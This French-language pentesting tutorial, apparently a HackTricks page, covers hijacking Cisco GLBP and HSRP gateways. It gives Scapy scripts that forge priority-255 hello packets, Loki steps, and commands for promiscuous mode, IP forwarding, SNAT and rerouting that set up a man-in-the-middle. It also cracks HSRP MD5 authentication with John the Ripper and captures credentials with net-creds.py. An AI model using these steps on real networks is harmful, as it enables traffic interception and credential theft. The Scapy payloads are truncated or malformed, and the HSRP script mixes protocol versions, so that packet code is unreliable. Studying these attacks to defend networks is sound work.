# GLBP & HSRP Attaques

{{#include ../../banners/hacktricks-training.md}}


## Aperçu du détournement FHRP

### Informations sur FHRP

FHRP est conçu pour fournir une robustesse réseau en regroupant plusieurs routeurs en une seule unité virtuelle, améliorant ainsi la répartition de charge et la tolérance aux pannes. Cisco Systems a introduit des protocoles importants de cette suite, tels que GLBP et HSRP.

### Informations sur le protocole GLBP

Le GLBP, créé par Cisco, fonctionne sur la pile TCP/IP et utilise UDP sur le port 3222 pour la communication. Les routeurs d'un groupe GLBP échangent des paquets "hello" toutes les 3 secondes. Si un routeur n'envoie pas ces paquets pendant 10 secondes, il est présumé hors ligne. Ces temporisations ne sont toutefois pas fixes et peuvent être modifiées.

GLBP pour IPv6 utilise le multicast **FF02::66** sur UDP/3222, et le format de MAC virtuel devient `0007.b4xx.xxyy` (l'AVF ID se trouve dans le dernier octet). Les temporisations et la surface d'attaque restent les mêmes que pour IPv4, donc les techniques de détournement fonctionnent toujours dans les réseaux dual‑stack.

### Fonctionnement de GLBP et répartition de charge

GLBP se distingue en permettant la répartition de charge entre routeurs en utilisant une seule IP virtuelle associée à plusieurs adresses MAC virtuelles. Dans un groupe GLBP, chaque routeur participe au routage des paquets. Contrairement à HSRP/VRRP, GLBP offre un véritable équilibrage de charge via plusieurs mécanismes :

- **Host-Dependent Load Balancing:** Maintient une attribution constante de l'adresse MAC AVF pour un hôte, essentiel pour des configurations NAT stables.
- **Round-Robin Load Balancing:** L'approche par défaut, alternant l'attribution d'adresses MAC AVF entre les hôtes demandeurs.
- **Weighted Round-Robin Load Balancing:** Distribue la charge en fonction de métriques "Weight" prédéfinies.

### Composants clés et terminologie dans GLBP

- **AVG (Active Virtual Gateway):** Le routeur principal, responsable de l'allocation des adresses MAC aux routeurs pairs.
- **AVF (Active Virtual Forwarder):** Un routeur désigné pour gérer le trafic réseau.
- **GLBP Priority:** Une métrique qui détermine l'AVG, commençant par défaut à 100 et variant entre 1 et 255.
- **GLBP Weight:** Reflète la charge actuelle d'un routeur, ajustable manuellement ou via Object Tracking.
- **GLBP Virtual IP Address:** Fait office de passerelle par défaut du réseau pour tous les appareils connectés.

Pour les échanges, GLBP utilise l'adresse multicast réservée 224.0.0.102 et le port UDP 3222. Les routeurs transmettent des paquets "hello" toutes les 3 secondes, et sont considérés comme non opérationnels si un paquet est manqué pendant 10 secondes.

### Mécanisme d'attaque GLBP

Un attaquant peut devenir le routeur principal en envoyant un paquet GLBP avec la valeur de priorité la plus élevée (255). Cela peut conduire à des attaques DoS ou MITM, permettant l'interception ou la redirection du trafic.

**Détournement GLBP pratique avec Scapy (court PoC)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
Créez les octets du payload pour imiter l'en-tête GLBP (version/opcode/priority/weight/VRID). La répétition de la trame garantit que vous remportez l'élection AVG si l'authentication est absente.

### Exécution d'une GLBP attack avec Loki

[Loki](https://github.com/raizo62/loki_on_kali) peut effectuer une GLBP attack en injectant un paquet avec priority et weight réglés à 255. Les étapes préalables à l'attaque consistent à recueillir des informations telles que l'adresse IP virtuelle, la présence d'authentication et les valeurs de priority du router en utilisant des outils comme Wireshark.

Attack Steps:

1. Passer en promiscuous mode et activer IP forwarding.
2. Identifier le router ciblé et récupérer son IP.
3. Générer un Gratuitous ARP.
4. Injecter un paquet GLBP malveillant, se faisant passer pour l'AVG.
5. Assigner une IP secondaire à l'interface réseau de l'attaquant, reflétant la GLBP virtual IP.
6. Mettre en place SNAT pour une visibilité complète du trafic.
7. Ajuster le routage pour assurer un accès à internet continu via le AVG router original.

En suivant ces étapes, l'attaquant se place en tant que "man in the middle", capable d'intercepter et d'analyser le trafic réseau, y compris les données non chiffrées ou sensibles.

Pour la démonstration, voici les extraits de commandes requis:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
La surveillance et l'interception du trafic peuvent être effectuées à l'aide de net-creds.py ou d'outils similaires pour capturer et analyser les données transitant par le réseau compromis.

### Explication passive de HSRP Hijacking avec détails de commande

#### Aperçu de HSRP (Hot Standby Router/Redundancy Protocol)

HSRP est un protocole propriétaire de Cisco conçu pour la redondance des passerelles réseau. Il permet de configurer plusieurs routeurs physiques en une seule unité logique avec une adresse IP partagée. Cette unité logique est gérée par un routeur primaire responsable de diriger le trafic. Contrairement à GLBP, qui utilise des métriques comme priorité et poids pour la répartition de charge, HSRP s'appuie sur un seul routeur actif pour la gestion du trafic.

HSRPv1 utilise le multicast **224.0.0.2** et la MAC virtuelle `0000.0c07.acXX` ; HSRPv2 et HSRPv2 pour IPv6 utilisent **224.0.0.102 / FF02::66** et la MAC virtuelle `0000.0c9f.fXXX`. Le port de destination UDP est **1985** pour IPv4 et **2029** pour IPv6.

#### Rôles et terminologie dans HSRP

- **HSRP Active Router** : L'appareil agissant comme passerelle, gérant le flux de trafic.
- **HSRP Standby Router** : Un routeur de secours, prêt à prendre le relais si le routeur actif tombe en panne.
- **HSRP Group** : Un ensemble de routeurs collaborant pour former un seul routeur virtuel résilient.
- **HSRP MAC Address** : Une adresse MAC virtuelle assignée au routeur logique dans la configuration HSRP.
- **HSRP Virtual IP Address** : L'adresse IP virtuelle du groupe HSRP, servant de passerelle par défaut pour les appareils connectés.

#### Versions de HSRP

HSRP existe en deux versions, HSRPv1 et HSRPv2, différant principalement par la capacité de groupe, l'utilisation des adresses multicast IP et la structure des adresses MAC virtuelles. Le protocole utilise des adresses multicast IP spécifiques pour l'échange d'informations de service, avec des paquets Hello envoyés toutes les 3 secondes. Un routeur est considéré inactif si aucun paquet n'est reçu pendant un intervalle de 10 secondes.

#### Mécanisme d'attaque HSRP

Les attaques HSRP consistent à prendre de force le rôle du Active Router en injectant une valeur de priorité maximale. Cela peut conduire à une attaque Man-In-The-Middle (MITM). Les étapes préalables essentielles à l'attaque incluent la collecte d'informations sur la configuration HSRP, ce qui peut être fait à l'aide de Wireshark pour l'analyse du trafic.

**Prise de contrôle rapide de HSRP avec Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
Si l'authentification n'est **pas** configurée, l'envoi continu de hellos avec une priorité supérieure force les pairs dans les états *Speak*/*Listen* et vous permet de devenir *Active*, redirigeant le trafic via votre hôte.

**HSRP authentication corner cases**

- L'authentification legacy en clair est trivialement usurpable.
- MD5 authentication only covers the HSRP payload; des paquets forgés peuvent encore rate-limit/DoS les plans de contrôle. Certaines releases NX-OS ont précédemment permis des DoS contre des groupes authentifiés (voir Cisco advisory CSCup11309).
- Sur de nombreux VLAN partagés d'ISP / VPS, les multicasts HSRPv1 sont visibles par les tenants ; sans auth vous pouvez rejoindre et préempter le trafic.

#### Étapes pour contourner l'authentification HSRP

1. Sauvegardez le trafic réseau contenant des données HSRP dans un fichier .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Extrayez les MD5 hashes du fichier .pcap en utilisant hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Craquez les MD5 hashes en utilisant John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Exécution de l'injection HSRP avec Loki**

1. Lancez Loki pour identifier les annonces HSRP.
2. Mettez l'interface réseau en mode promiscuité et activez l'IP forwarding.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Utilisez Loki pour cibler le routeur spécifique, saisissez le mot de passe HSRP craqué, et effectuez les configurations nécessaires pour vous faire passer pour le routeur Active.
4. Après avoir obtenu le rôle de routeur Active, configurez votre interface réseau et iptables pour intercepter le trafic légitime.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Modifiez la table de routage pour faire transiter le trafic via l'ancien routeur Active.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Utilisez net-creds.py ou un utilitaire similaire pour capturer des identifiants depuis le trafic intercepté.
```shell
sudo python2 net-creds.py -i eth0
```

L'exécution de ces étapes place l'attaquant en position d'intercepter et de manipuler le trafic, de façon similaire à la procédure pour GLBP hijacking. Cela met en évidence la vulnérabilité des protocoles de redondance comme HSRP et la nécessité de mesures de sécurité robustes.

## Références

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
